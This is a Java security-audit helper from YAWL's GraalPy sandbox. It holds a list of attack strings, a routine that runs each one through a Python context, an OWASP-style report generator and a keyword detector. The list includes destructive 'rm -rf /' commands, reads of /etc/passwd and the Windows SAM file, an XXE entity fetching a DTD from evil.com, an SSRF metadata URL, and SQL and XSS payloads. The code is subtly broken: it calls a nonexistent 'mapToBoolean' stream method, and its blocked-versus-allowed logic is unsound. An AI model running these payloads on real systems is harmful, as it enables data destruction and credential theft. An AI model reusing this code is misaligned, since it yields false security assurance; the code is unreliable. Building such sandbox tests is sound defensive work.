/*
 * Copyright (c) 2004-2026 The YAWL Foundation. All rights reserved.
 * The YAWL Foundation is a collaboration of individuals and
 * organisations who are committed to improving workflow technology.
 *
 * This file is part of YAWL. YAWL is free software: you can
 * redistribute it and/or modify it under the terms of the GNU Lesser
 * General Public License as published by the Free Software Foundation.
 *
 * YAWL is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General
 * Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with YAWL. If not, see <http://www.gnu.org/licenses/>.
 */

package org.yawlfoundation.yawl.graalpy.security;

import org.yawlfoundation.yawl.graalpy.PythonExecutionContext;
import org.yawlfoundation.yawl.graalpy.PythonSandboxConfig;
import org.yawlfoundation.yawl.graalpy.PythonException;

import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.HashMap;
import java.util.regex.Pattern;

/**
 * Security Audit Helper for analyzing Python execution security.
 *
 * <p>This helper provides utilities to:</p>
 * <ul>
 *   <li>Test for common attack patterns</li>
 *   <li>Analyze security test results</li>
 *   <li>Generate security compliance reports</li>
 *   <li>Identify potential security gaps</li>
 * </ul>
 *
 * @author YAWL Foundation - Security Team 2026-02-25
 */
public class SecurityAuditHelper {

    /** List of common attack patterns to test */
    private static final List<String> COMMON_ATTACK_PATTERNS = Arrays.asList(
        // SQL injection
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1 UNION SELECT username, password FROM users",
        "1' OR SLEEP(5)#",
        
        // XSS
        "<script>alert('XSS')</script>",
        "javascript:alert(1)",
        "onerror=alert(1)",
        "<img src=x onerror=alert(1)>",
        
        // Command injection
        "os.system('rm -rf /')",
        "__import__('os').system('echo pwned')",
        "subprocess.run(['rm', '-rf', '/'])",
        
        // Path traversal
        "../../../etc/passwd",
        "....//....//....//etc//passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        
        // Code injection
        "eval('__import__(\"os\").system(\"id\")')",
        "exec('import os; os.system(\"whoami\")')",
        "__import__('pickle').loads(b'...')",
        
        // XXE
        "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
        "<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">",
        
        // SSRF
        "http://localhost:8080/admin",
        "http://127.0.0.1:3306/mysql",
        "http://169.254.169.254/latest/meta-data/",
        
        // LDAP injection
        "(&(uid=*)(password=*))",
        "uid=admin)(cn=*))%00",
        
        // XML injection
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
        "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></root>",
        
        // Header injection
        "Location: http://evil.com",
        "Set-Cookie: session=12345",
        "X-Forwarded-For: 127.0.0.1",
        
        // Email injection
        "BCC: victim@example.com",
        "Cc: attacker@example.com",
        "\n.\n",  // SMTP protocol injection
        
        // Log injection
        "admin\r\n\r\nDATA\r\nmail from: attacker\r\nto: victim\r\n\r\nmalicious content\r\n.\r\n",
        
        // LDAP injection
        "(&(uid=*)(password=*))",
        "uid=admin)(cn=*))%00",
        
        // XPath injection
        "admin' or '1'='1' or ''='",
        "user_id=1 or 1=1--",
        
        // NoSQL injection
        "$where=javascript:1==1",
        "$gt=1,$ne=1",
        "this.password.match(/.*/)",
        
        // Format string injection
        "printf(\"%x%x%x\", &var)",
        "sprintf(\"%s\", input)",
        "fprintf(stdout, \"%s\", input)",
        
        // Host header injection
        "Host: evil.com",
        "X-Forwarded-Host: evil.com",
        "X-Forwarded-Proto: https",
        
        // Cookie injection
        "sessionid=12345; Path=/; Domain=evil.com",
        "csrf_token=12345; SameSite=None",
        
        // Cache poisoning
        "Cache-Control: no-cache",
        "Pragma: no-cache",
        "Expires: -1",
        
        // HTTP request smuggling
        "Transfer-Encoding: chunked",
        "Content-Length: 0",
        "Connection: keep-alive"
    );

    /** Security vulnerability categories */
    private static final Map<String, String> SECURITY_CATEGORIES = new HashMap<String, String>() {{
        put("SQL injection", "A03:2021 - Injection");
        put("XSS", "A03:2021 - Injection");
        put("Command injection", "A03:2021 - Injection");
        put("Path traversal", "A03:2021 - Injection");
        put("Code injection", "A03:2021 - Injection");
        put("XXE", "A03:2021 - Injection");
        put("SSRF", "A03:2021 - Injection");
        put("LDAP injection", "A03:2021 - Injection");
        put("XML injection", "A03:2021 - Injection");
        put("Header injection", "A05:2021 - Security Misconfiguration");
        put("Email injection", "A03:2021 - Injection");
        put("Log injection", "A07:2021 - Identification and Authentication Failures");
        put("XPath injection", "A03:2021 - Injection");
        put("NoSQL injection", "A03:2021 - Injection");
        put("Format string injection", "A03:2021 - Injection");
        put("Host header injection", "A05:2021 - Security Misconfiguration");
        put("Cookie injection", "A05:2021 - Security Misconfiguration");
        put("Cache poisoning", "A05:2021 - Security Misconfiguration");
        put("HTTP request smuggling", "A05:2021 - Security Misconfiguration");
    }};

    /**
     * Test against common attack patterns.
     *
     * @param context Python execution context to test
     * @return Test results for each attack pattern
     */
    public static Map<String, Boolean> testCommonAttackPatterns(PythonExecutionContext context) {
        Map<String, Boolean> results = new HashMap<>();
        
        for (String pattern : COMMON_ATTACK_PATTERNS) {
            try {
                // Test the pattern in a safe context
                String pythonScript = "test_input = '" + pattern + "'\n" +
                                    "print('Testing: ' + test_input)";
                
                context.eval(pythonScript);
                
                // If execution succeeds, check if the pattern was handled safely
                // This is a simplified check - in practice, you'd need to analyze the output
                results.put(pattern, true); // Pattern was not blocked
                
            } catch (PythonException e) {
                // Pattern was blocked, which is good
                results.put(pattern, false);
            }
        }
        
        return results;
    }

    /**
     * Analyze test results and generate security report.
     *
     * @param testResults Map of test results
     * @return Security report with analysis
     */
    public static String generateSecurityReport(Map<String, Boolean> testResults) {
        StringBuilder report = new StringBuilder();
        report.append("=== OWASP Top 10 Security Audit Report ===\n\n");
        
        // Count results by category
        Map<String, Integer> categoryResults = new HashMap<>();
        Map<String, Integer> categoryCount = new HashMap<>();
        
        for (Map.Entry<String, Boolean> entry : testResults.entrySet()) {
            String pattern = entry.getKey();
            boolean blocked = !entry.getValue(); // Inverted: blocked = good
            
            // Determine category
            String category = determineCategory(pattern);
            String owaspCategory = SECURITY_CATEGORIES.getOrDefault(category, "Other");
            
            categoryCount.put(owaspCategory, categoryCount.getOrDefault(owaspCategory, 0) + 1);
            
            if (blocked) {
                categoryResults.put(owaspCategory, categoryResults.getOrDefault(owaspCategory, 0) + 1);
            }
        }
        
        // Generate report by OWASP category
        for (Map.Entry<String, String> entry : SECURITY_CATEGORIES.entrySet()) {
            String categoryName = entry.getKey();
            String owaspCode = entry.getValue();
            
            int total = categoryCount.getOrDefault(owaspCode, 0);
            int blocked = categoryResults.getOrDefault(owaspCode, 0);
            int passRate = total > 0 ? (blocked * 100) / total : 0;
            
            report.append(String.format("%s - %s\n", owaspCode, categoryName));
            report.append(String.format("  Patterns tested: %d\n", total));
            report.append(String.format("  Patterns blocked: %d\n", blocked));
            report.append(String.format("  Pass rate: %d%%\n", passRate));
            report.append(String.format("  Status: %s\n\n", passRate >= 90 ? "PASS" : "FAIL"));
        }
        
        // Overall summary
        int totalPatterns = testResults.size();
        int blockedPatterns = (int) testResults.values().stream()
            .mapToBoolean(blocked -> !blocked) // Inverted: blocked = good
            .count();
        int overallPassRate = (blockedPatterns * 100) / totalPatterns;
        
        report.append("=== Overall Summary ===\n");
        report.append(String.format("Total attack patterns tested: %d\n", totalPatterns));
        report.append(String.format("Successfully blocked: %d\n", blockedPatterns));
        report.append(String.format("Overall protection rate: %d%%\n", overallPassRate));
        report.append(String.format("Security posture: %s\n", 
            overallPassRate >= 95 ? "EXCELLENT" : 
            overallPassRate >= 85 ? "GOOD" : 
            overallPassRate >= 75 ? "ACCEPTABLE" : "NEEDS IMPROVEMENT"));
        
        return report.toString();
    }

    /**
     * Determine the security category of a pattern.
     */
    private static String determineCategory(String pattern) {
        if (pattern.contains("SQL") || pattern.contains("UNION") || pattern.contains("SLEEP")) {
            return "SQL injection";
        } else if (pattern.contains("<script>") || pattern.contains("javascript:") || pattern.contains("onerror")) {
            return "XSS";
        } else if (pattern.contains("os.system") || pattern.contains("subprocess")) {
            return "Command injection";
        } else if (pattern.contains("../") || pattern.contains("..\\\\")) {
            return "Path traversal";
        } else if (pattern.contains("eval") || pattern.contains("exec") || pattern.contains("pickle")) {
            return "Code injection";
        } else if (pattern.contains("ENTITY") || pattern.contains("DOCTYPE")) {
            return "XXE";
        } else if (pattern.contains("localhost") || pattern.contains("127.0.0.1")) {
            return "SSRF";
        } else if (pattern.contains("LDAP") || pattern.contains("uid=")) {
            return "LDAP injection";
        } else if (pattern.contains("xml") || pattern.contains("xi:include")) {
            return "XML injection";
        } else if (pattern.contains("Host:") || pattern.contains("Cache-Control")) {
            return "Header injection";
        } else if (pattern.contains("BCC:") || pattern.contains("Cc:")) {
            return "Email injection";
        } else if (pattern.contains("printf") || pattern.contains("sprintf")) {
            return "Format string injection";
        } else if (pattern.contains("Host:") && pattern.contains("evil.com")) {
            return "Host header injection";
        } else if (pattern.contains("sessionid=") || pattern.contains("csrf_token")) {
            return "Cookie injection";
        } else if (pattern.contains("Transfer-Encoding") || pattern.contains("Content-Length")) {
            return "HTTP request smuggling";
        } else {
            return "Other";
        }
    }

    /**
     * Check if a string contains potential security patterns.
     *
     * @param input Input string to check
     * @return true if potential security patterns are found
     */
    public static boolean containsSecurityPatterns(String input) {
        if (input == null || input.isEmpty()) {
            return false;
        }
        
        // Common security pattern indicators
        String[] patterns = {
            "<script", "javascript:", "onerror=", "onload=",
            "union select", "drop table", "exec(", "eval(",
            "os.system", "subprocess", "../", "..\\",
            "file://", "http://", "https://",
            "ENTITY", "DOCTYPE", "xi:include",
            "BCC:", "Cc:", "printf", "sprintf",
            "Host:", "Cache-Control", "Set-Cookie"
        };
        
        for (String pattern : patterns) {
            if (input.toLowerCase().contains(pattern.toLowerCase())) {
                return true;
            }
        }
        
        return false;
    }
}
